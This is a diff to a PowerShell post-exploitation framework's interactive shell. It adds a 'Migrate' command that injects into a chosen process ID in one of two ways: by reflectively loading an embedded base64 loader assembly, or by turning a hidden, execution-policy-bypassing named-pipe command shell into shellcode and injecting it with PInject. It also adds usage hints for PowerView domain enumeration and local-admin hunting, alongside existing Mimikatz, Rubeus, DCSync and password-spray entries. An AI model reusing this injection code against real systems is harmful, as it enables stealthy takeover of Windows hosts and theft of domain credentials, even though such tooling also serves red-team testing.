@@ -1910,8 +1910,12 @@ function Start-LocalShell {
             Write-Host '     Use from a remote session instead.' -ForegroundColor Yellow
         }
         'Migrate' = {
-            Write-Host ' [-] Migrate requires PInject loaded and a target PID.' -ForegroundColor Yellow
-            Write-Host '     Load PInject first, then call the injection function manually.' -ForegroundColor Yellow
+            Write-Host " Usage:" -ForegroundColor Cyan
+            Write-Host "   Migrate ps <pid>   inject PS runspace via AmnesiacLoader (stealth, no PInject needed)" -ForegroundColor Yellow
+            Write-Host "   Migrate <pid>      shellcode injection via PInject (load PInject first)" -ForegroundColor Yellow
+            Write-Host ""
+            Write-Host "   Process            list processes to find target PID" -ForegroundColor Gray
+            Write-Host "   Migrate ps 1234    recommended: stealth, uses embedded AmnesiacLoader" -ForegroundColor Gray
         }
         'MonitorRead' = {
             if ($global:TGTCache -and $global:TGTCache.Count -gt 0) {
@@ -1931,8 +1935,15 @@ function Start-LocalShell {
     $_kw = @{
         'Patch'            = @{ tools=@('SimpleAMSI');                                           invoke=$null }
         'PatchNet'         = @{ tools=@('NETAMSI');                                              invoke=$null }
-        'PInject'          = @{ tools=@('PInject');                                              invoke=$null }
-        'PowerView'        = @{ tools=@('pwv');                                                  invoke=$null }
+        'PInject'          = @{ tools=@('PInject');                                              invoke=$null
+                                hint=@(" [*] Run 'Process' to find a target PID, then:"
+                                       " [*]   Migrate ps <pid>   — stealth (AmnesiacLoader, recommended)"
+                                       " [*]   Migrate <pid>      — shellcode injection via PInject") }
+        'PowerView'        = @{ tools=@('pwv');                                                  invoke=$null
+                                hint=@(" [*] Key: Get-Domain | Get-DomainUser | Get-DomainComputer | Get-DomainGroup"
+                                       " [*]   Find-DomainShare | select Name,ComputerName,Path"
+                                       " [*]   Get-DomainGroupMember -Identity 'Domain Admins'"
+                                       " [*]   Get-DomainTrust | Get-NetLoggedon -ComputerName <host>") }
         'Mimi'             = @{ tools=@('Suntour');                                              invoke=$null }
         'Rubeus'           = @{ tools=@('Ferrari');                                              invoke=$null }
         'Ask4Creds'        = @{ tools=@('Ask4Creds');                                            invoke=$null }
@@ -1949,7 +1960,11 @@ function Start-LocalShell {
         'CredValidate'     = @{ tools=@('Validate-Credentials');                                 invoke=$null }
         'DCSync'           = @{ tools=@('Sync');                                                 invoke=$null }
         'Impersonation'    = @{ tools=@('Token-Impersonation');                                  invoke=$null }
-        'LocalAdminAccess' = @{ tools=@('Find-LocalAdminAccess');                                invoke=$null }
+        'LocalAdminAccess' = @{ tools=@('Find-LocalAdminAccess');                                invoke=$null
+                                hint=@(" [*] Usage: Find-LocalAdminAccess"
+                                       " [*]   -Domain NORTH.SEVENKINGDOMS.LOCAL -DomainController 10.3.10.11"
+                                       " [*]   -Targets 10.3.10.11,10.3.10.22  (specific hosts)"
+                                       " [*]   -Username <dom\user> -Password <pass>  (explicit creds)") }
         'PassSpray'        = @{ tools=@('PassSpray');                                            invoke=$null }
         'Remoting'         = @{ tools=@('Invoke-SMBRemoting','Invoke-WMIRemoting');             invoke=$null }
         'SessionHunter'    = @{ tools=@('Invoke-SessionHunter'); invoke=$null
@@ -2033,7 +2048,8 @@ function Start-LocalShell {
             Write-Host "   HashGrab          " -NoNewline -ForegroundColor Yellow; Write-Host "Attempt to retrieve the hash of the current user"
             Write-Host "   Hive              " -NoNewline -ForegroundColor Yellow; Write-Host "HiveDump - SAM / SYSTEM / SECURITY"
             Write-Host "   Kerb              " -NoNewline -ForegroundColor Yellow; Write-Host "Dump Kerberos TGTs - use: Invoke-Kirby"
-            Write-Host "   Migrate <pid>     " -NoNewline -ForegroundColor Yellow; Write-Host "Inject payload into specified PID [requires PInject]"
+            Write-Host "   Migrate ps <pid>  " -NoNewline -ForegroundColor Yellow; Write-Host "Inject into PID via AmnesiacLoader (stealth, recommended)"
+            Write-Host "   Migrate <pid>     " -NoNewline -ForegroundColor Yellow; Write-Host "Inject shellcode into PID [requires PInject loaded first]"
             Write-Host "   Monitor           " -NoNewline -ForegroundColor Yellow; Write-Host "Monitor cache for TGTs - use: TGT_Monitor"
             Write-Host "   MonitorRead       " -NoNewline -ForegroundColor Yellow; Write-Host "Retrieve TGTs from monitor activity"
             Write-Host "   MonitorClear      " -NoNewline -ForegroundColor Yellow; Write-Host "Clear TGTs from monitor activity"
@@ -2481,6 +2497,69 @@ function Start-LocalShell {
             } else {
                 Write-Host " [-] 'Invoke-SharpRDP' not in cache. Add Invoke-SharpRDP.ps1 to Tools\ and run: modules reload" -ForegroundColor Red
             }
+            continue
+        }
+
+        # ── Migrate ps <pid>: AmnesiacLoader reflective PS injection ─────────
+        if ($cmd -imatch '^Migrate\s+ps\s+(\d+)$') {
+            $targetPid = [int]$Matches[1]
+            if (-not $AmnesiacLoaderB64) {
+                Write-Host " [!] AmnesiacLoader not embedded — run AmnesiacLoader\Build.ps1 first." -ForegroundColor Red; continue
+            }
+            if (-not $_alNs -or -not $_alInj -or -not $_alInPS) {
+                Write-Host " [!] AL name-map vars not set — run AmnesiacLoader\Build.ps1 and reload." -ForegroundColor Red; continue
+            }
+            $_alMig = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq $_alNs } | Select-Object -First 1
+            if (-not $_alMig) {
+                try {
+                    $bytes = [Convert]::FromBase64String($AmnesiacLoaderB64)
+                    $_alMig = [Reflection.Assembly]::Load($bytes)
+                } catch { Write-Host " [-] Failed to load AmnesiacLoader: $($_.Exception.Message)" -ForegroundColor Red; continue }
+            }
+            $PN = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
+            $mySID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+            $built = New-PayloadScript -IsServer -PipeName $PN -SID $mySID
+            Write-Host " [*] Injecting PS runspace into PID $targetPid..." -ForegroundColor Cyan
+            try {
+                $_alMig.GetType("$_alNs.$_alInj").GetMethod("$_alInPS").Invoke($null, @([int]$targetPid, $built.RawScript))
+            } catch { Write-Host " [-] Injection failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
+            Write-Host " [+] Injected. Connecting to pipe $PN (10s timeout)..." -ForegroundColor Green
+            Start-Sleep -Milliseconds 800
+            try {
+                $mgClient = New-Object System.IO.Pipes.NamedPipeClientStream('.', $PN, [System.IO.Pipes.PipeDirection]::InOut)
+                $mgClient.Connect(10000)
+                $mgSW = New-Object System.IO.StreamWriter($mgClient)
+                $mgSR = New-Object System.IO.StreamReader($mgClient)
+                InteractWithPipeSession -PipeClient $mgClient -StreamWriter $mgSW -StreamReader $mgSR -computerNameOnly $localFQDN -PipeName $PN
+            } catch { Write-Host " [-] Failed to connect to migrated process: $($_.Exception.Message)" -ForegroundColor Red }
+            continue
+        }
+
+        # ── Migrate <pid>: shellcode injection via PInject ────────────────────
+        if ($cmd -imatch '^Migrate\s+(\d+)$') {
+            $targetPid = $Matches[1]
+            if (-not (Get-Command 'PInject' -ErrorAction SilentlyContinue)) {
+                Write-Host " [-] PInject not loaded. Run 'PInject' first to load the module." -ForegroundColor Red
+                Write-Host "     Or use stealth variant: Migrate ps $targetPid  (no PInject needed)" -ForegroundColor Yellow
+                continue
+            }
+            $PN = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
+            $SID_mg = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+            $Srv_mg = "`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID_mg`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm=New-Object System.Threading.Timer(`$tcb,`$ps,600000,[System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
+            $b64_mg = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Srv_mg))
+            $fin_mg = "powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64_mg"
+            $sc_mg  = ShellGen -ShCommand $fin_mg
+            Write-Host " [*] Injecting shellcode into PID $targetPid via PInject..." -ForegroundColor Cyan
+            PInject /t:1 /f:hex /pid:$targetPid /sc:$sc_mg.Trim() /enc:AES
+            Write-Host " [+] Injected. Connecting to pipe $PN (15s timeout)..." -ForegroundColor Green
+            Start-Sleep -Seconds 2
+            try {
+                $mgClient = New-Object System.IO.Pipes.NamedPipeClientStream('.', $PN, [System.IO.Pipes.PipeDirection]::InOut)
+                $mgClient.Connect(15000)
+                $mgSW = New-Object System.IO.StreamWriter($mgClient)
+                $mgSR = New-Object System.IO.StreamReader($mgClient)
+                InteractWithPipeSession -PipeClient $mgClient -StreamWriter $mgSW -StreamReader $mgSR -computerNameOnly $localFQDN -PipeName $PN
+            } catch { Write-Host " [-] Failed to connect: $($_.Exception.Message)" -ForegroundColor Red }
             continue
         }
 
